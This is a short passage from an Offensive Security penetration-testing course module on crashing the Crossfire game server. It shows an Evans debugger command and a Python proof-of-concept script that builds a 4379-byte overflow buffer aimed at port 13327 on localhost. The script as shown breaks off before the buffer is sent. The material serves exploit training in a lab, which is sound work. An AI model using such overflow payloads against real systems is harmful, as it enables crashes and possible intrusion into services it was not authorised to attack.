  md: '# OFFENSIVE Security


    Penetration Testing with Kali Linux


    In more recent Linux kernels and compilers, various memory protection techniques
    have been implemented, such as memory randomization, stack cookies, etc. Bypassing
    these protection mechanisms is beyond the scope of this module. The version of
    crossfire we are testing was compiled without the stack smashing protection support,
    as well as without ASLR and DEP support.


    # 8.2 - Crashing Crossfire


    We can start the vulnerable Crossfire application using the Evans debugger, using
    the following command:


    ```

    root@kali:~# edb --usr/games/crossfire/bin/crossfire

    ```


    The debugger pauses the application at start, so we need to hit the run button
    twice, to allow the program to actually execute.


    Once the crossfire application running, we can use the following Proof of Concept
    (PoC) code, found on the Exploit Database to crash the application.


    ```

    #/usr/bin/python

    import socket


    host = "127.0.0.1"

    crash="\x41" * 4379


    buffer = "\x11(set sound " + crash + "\x90\x00#"


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("[*]Sending evil buffer...")

    s.connect((host, 13327))

    data=s.recv(1024)

    ```'
